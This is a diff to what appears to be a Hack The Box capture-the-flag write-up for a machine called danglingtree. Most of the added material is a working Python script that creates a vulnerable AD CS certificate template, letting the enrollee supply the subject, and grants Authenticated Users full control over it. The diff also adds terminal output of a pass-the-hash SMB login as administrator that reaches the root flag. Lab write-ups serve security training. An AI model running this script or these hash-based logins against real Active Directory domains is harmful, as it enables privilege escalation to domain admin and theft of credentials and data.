@@ -1858,56 +1858,160 @@ RemoteAccessVPN EmployeeAuthTemplate VPNUserTemplate DirectoryEmailReplication D
 
 command:
 
-``` powershell
+``` py
 
-C:\>powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
+#!/usr/bin/env python3
+
+import argparse
+import secrets
+import ssl
+import struct
+
+from impacket.ldap import ldaptypes
+from ldap3 import ALL, BASE, MODIFY_REPLACE, SUBTREE, Connection, Server, SIMPLE, Tls
+from ldap3.protocol.microsoft import security_descriptor_control
+
+CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"
+
+def fail(connection, action):
+    raise SystemExit(f"[-] {action}: {connection.result}")
+
+def create_ace(sid, mask):
+    ace = ldaptypes.ACE()
+    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    ace["AceFlags"] = 0
+    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
+    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
+    ace["Ace"]["Mask"]["Mask"] = mask
+    ace["Ace"]["Sid"] = ldaptypes.LDAP_SID()
+    ace["Ace"]["Sid"].fromCanonical(sid)
+    return ace
+
+def create_security_descriptor(sid):
+    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    descriptor["Revision"] = b"\x01"
+    descriptor["Sbz1"] = b"\x00"
+    descriptor["Control"] = 0x9C04
+    descriptor["OwnerSid"] = ldaptypes.LDAP_SID()
+    descriptor["OwnerSid"].fromCanonical(sid)
+    descriptor["GroupSid"] = b""
+    descriptor["Sacl"] = b""
+    descriptor["Dacl"] = ldaptypes.ACL()
+    descriptor["Dacl"]["AclRevision"] = 2
+    descriptor["Dacl"]["Sbz1"] = 0
+    descriptor["Dacl"]["Sbz2"] = 0
+    descriptor["Dacl"].aces = [
+        create_ace(sid, 983551),
+        create_ace("S-1-5-11", 131220),
+    ]
+    return descriptor
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-H", "--host", required=True)
+parser.add_argument("-u", "--user", required=True)
+parser.add_argument("-p", "--password", required=True)
+parser.add_argument("-t", "--template", default="EmployeeAuthTemplate")
+args = parser.parse_args()
+
+tls = Tls(validate=ssl.CERT_NONE)
+server = Server(args.host, port=636, use_ssl=True, tls=tls, get_info=ALL)
+connection = Connection(
+    server,
+    user=args.user,
+    password=args.password,
+    authentication=SIMPLE,
+    auto_bind=True,
+    check_names=False,
+)
+
+config_dn = server.info.other["configurationNamingContext"][0]
+oid_base = f"CN=OID,CN=Public Key Services,CN=Services,{config_dn}"
+template_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}"
+template_dn = f"CN={args.template},{template_base}"
+
+connection.search(template_dn, "(objectClass=*)", BASE, attributes=["cn"])
+template_exists = bool(connection.entries)
+
+if not template_exists:
+    connection.search(oid_base, "(objectClass=*)", BASE, attributes=["msPKI-Cert-Template-OID"])
+    root_oid = connection.entries[0]["msPKI-Cert-Template-OID"].value
+
+    connection.search(
+        oid_base,
+        "(objectClass=msPKI-Enterprise-Oid)",
+        SUBTREE,
+        attributes=["msPKI-Cert-Template-OID"],
+    )
+    prefix = f"{root_oid}.1."
+    indexes = []
+    for entry in connection.entries:
+        value = entry["msPKI-Cert-Template-OID"].value
+        if value and value.startswith(prefix) and value[len(prefix):].isdigit():
+            indexes.append(int(value[len(prefix):]))
+
+    index = max(indexes, default=0) + 1
+    template_oid = f"{prefix}{index}"
+    oid_cn = f"{index}.{secrets.token_hex(16).upper()}"
+    oid_dn = f"CN={oid_cn},{oid_base}"
+
+    oid_attributes = {
+        "objectClass": ["top", "msPKI-Enterprise-Oid"],
+        "cn": oid_cn,
+        "displayName": args.template,
+        "flags": 1,
+        "msPKI-Cert-Template-OID": template_oid,
+    }
+
+    if not connection.add(oid_dn, attributes=oid_attributes):
+        fail(connection, "OID creation failed")
+
+    template_attributes = {
+        "objectClass": ["top", "pKICertificateTemplate"],
+        "cn": args.template,
+        "displayName": args.template,
+        "instanceType": 4,
+        "showInAdvancedViewOnly": True,
+        "flags": 0,
+        "revision": 1,
+        "pKIDefaultKeySpec": 2,
+        "pKIKeyUsage": b"\x86\x00",
+        "pKIMaxIssuingDepth": -1,
+        "pKICriticalExtensions": ["2.5.29.19", "2.5.29.15"],
+        "pKIExpirationPeriod": struct.pack("<q", -315360000000000),
+        "pKIOverlapPeriod": struct.pack("<q", -36288000000000),
+        "pKIExtendedKeyUsage": [CLIENT_AUTH],
+        "pKIDefaultCSPs": [
+            "2,Microsoft Base Cryptographic Provider v1.0",
+            "1,Microsoft Enhanced Cryptographic Provider v1.0",
+        ],
+        "msPKI-RA-Signature": 0,
+        "msPKI-Enrollment-Flag": 0,
+        "msPKI-Private-Key-Flag": 16,
+        "msPKI-Certificate-Name-Flag": 1,
+        "msPKI-Minimal-Key-Size": 2048,
+        "msPKI-Template-Schema-Version": 1,
+        "msPKI-Template-Minor-Revision": 1,
+        "msPKI-Cert-Template-OID": template_oid,
+    }
+
+    if not connection.add(template_dn, attributes=template_attributes):
+        connection.delete(oid_dn)
+        fail(connection, "template creation failed")
+
+    print(f"[+] OID:      {template_oid}")
+    print(f"[+] OID DN:   {oid_dn}")
+
+descriptor = create_security_descriptor("S-1-5-11").getData()
+changes = {"nTSecurityDescriptor": [(MODIFY_REPLACE, [descriptor])]}
+control = security_descriptor_control(sdflags=0x04)
+if not connection.modify(template_dn, changes, controls=control):
+    fail(connection, "DACL update failed")
+
+print(f"[+] Template: {template_dn}")
+print("[+] Authenticated Users received full control")
 
 ```
 
-``` powershell
-
-C:\>powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
-powershell -c "Import-Module ActiveDirectory; $src = Get-ADObject 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -Properties msPKI-Cert-Template-OID,msPKI-Enrollment-Flag,pKIExtendedKeyUsage,pKIExpirationPeriod,pKIOverlapPeriod,pKIDefaultKeySpec,pKIMaxIssuingDepth; New-ADObject -Name 'VPNUserTemplate' -Type pKICertificateTemplate -Path 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' -OtherAttributes @{'msPKI-Cert-Template-OID'=[string]$src.'msPKI-Cert-Template-OID';'msPKI-Certificate-Name-Flag'=1;'msPKI-Enrollment-Flag'=[int]$src.'msPKI-Enrollment-Flag';'msPKI-RA-Signature'=0;'msPKI-Template-Schema-Version'=2;'msPKI-Minimal-Key-Size'=2048;'pKIMaxIssuingDepth'=0;'pKIDefaultKeySpec'=1;'pKIExtendedKeyUsage'=[string[]]$src.pKIExtendedKeyUsage;'pKIExpirationPeriod'=[byte[]]$src.pKIExpirationPeriod;'pKIOverlapPeriod'=[byte[]]$src.pKIOverlapPeriod}"
-
-C:\>certutil -dsTemplate VPNUserTemplate
-certutil -dsTemplate VPNUserTemplate
-[Version]
-Signature = "$Windows NT$"
-
-
-[VPNUserTemplate]
-    objectClass = "top", "pKICertificateTemplate"
-    cn = "VPNUserTemplate"
-    distinguishedName = "CN=VPNUserTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
-    instanceType = "4"
-    whenCreated = "20260827062436.0Z"
-    whenChanged = "20260827062436.0Z"
-    uSNCreated = "192737"
-    uSNChanged = "192737"
-    showInAdvancedViewOnly = "TRUE"
-    nTSecurityDescriptor = "D:AI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4220238332-57023728-1129110646-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA)"
-    name = "VPNUserTemplate"
-    objectGUID = "4ad0832b-46c0-4eae-b049-ac5f1fd7f59b"
-    objectCategory = "CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=danglingtree,DC=htb"
-    pKIDefaultKeySpec = "1"
-    pKIMaxIssuingDepth = "0"
-    pKIExpirationPeriod =  "1 Years"
-    pKIOverlapPeriod =  "6 Weeks"
-    pKIExtendedKeyUsage = "1.3.6.1.5.5.7.3.2", "1.3.6.1.5.5.7.3.4", "1.3.6.1.4.1.311.10.3.4"
-    dSCorePropagationData = "16010101000000.0Z"
-    msPKI-RA-Signature = "0"
-    msPKI-Enrollment-Flag = "41"
-    msPKI-Certificate-Name-Flag = "1"
-    msPKI-Minimal-Key-Size = "2048"
-    msPKI-Template-Schema-Version = "2"
-    msPKI-Cert-Template-OID = "1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.1"
-
-
-[TemplateList]
-    Template = "VPNUserTemplate"
-CertUtil: -dsTemplate command completed successfully.
-
-```
 
 ``` bash
 
@@ -1972,6 +2076,48 @@ File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will sav
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
 ╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                      ✔ │ 4s ─╮
+╰─                                                                                                          ─╯
+
+```
+
+``` bash
+
+❯ impacket-smbclient 'danglingtree.htb/administrator@10.129.82.118' -hashes ':8cacb3a97e460c65d105ca7cd9913925'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+Type help for list of commands
+# shares
+Share Name                Type            Comment
+----------------------------------------------------------------------
+ADMIN$                    DISK (SPECIAL)  Remote Admin
+C$                        DISK (SPECIAL)  Default share
+IPC$                      IPC (SPECIAL)   Remote IPC
+IT                        DISK
+NETLOGON                  DISK            Logon server share
+SYSVOL                    DISK            Logon server share
+# use C$
+# cd Users\Administrator\Desktop
+# ls
+drw-rw-rw-          0  Mon Jun  8 19:27:58 2026 .
+drw-rw-rw-          0  Thu Mar 26 06:19:15 2026 ..
+-rw-rw-rw-        282  Thu Mar 26 06:19:15 2026 desktop.ini
+-rw-rw-rw-         34  Thu Aug 27 11:53:10 2026 root.txt
+# get root.txt
+# Traceback (most recent call last):
+  File "/usr/share/doc/python3-impacket/examples/smbclient.py", line 126, in <module>
+    main()
+    ~~~~^^
+  File "/usr/share/doc/python3-impacket/examples/smbclient.py", line 117, in main
+    shell.cmdloop()
+    ~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/cmd.py", line 134, in cmdloop
+    line = input(self.prompt)
+KeyboardInterrupt
+
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                 INT х │ 38s ─╮
+❯ cat root.txt
+4az<REDACTED>9f3
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                           ✔ ─╮
 ╰─                                                                                                          ─╯
 
 ```
